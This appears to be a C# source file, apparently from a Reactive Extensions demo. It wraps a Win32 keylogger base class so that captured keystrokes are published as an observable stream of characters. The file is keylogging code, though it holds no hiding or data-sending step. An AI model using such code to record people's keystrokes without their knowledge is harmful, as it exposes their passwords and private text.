using System;
using System.Reactive.Disposables;
using System.Windows.Forms;

namespace CodeReactions.Keylogger
{
	public sealed class ObservableKeylogger
		: Win32Keylogger, IObservable<char>
	{
		private IObserver<char> observer;

		public ObservableKeylogger()
			: base() { }

		protected override void HandleKey(Keys key)
		{
			if (this.observer != null)
			{
				this.observer.OnNext(Convert.ToChar((int)key));
			}
		}

		public override void Dispose()
		{
			if (this.observer != null)
			{
				this.observer.OnCompleted();
			}

			base.Dispose();
		}

		public IDisposable Subscribe(IObserver<char> observer)
		{
			this.observer = observer;
			return Disposable.Empty;
		}
	}
}
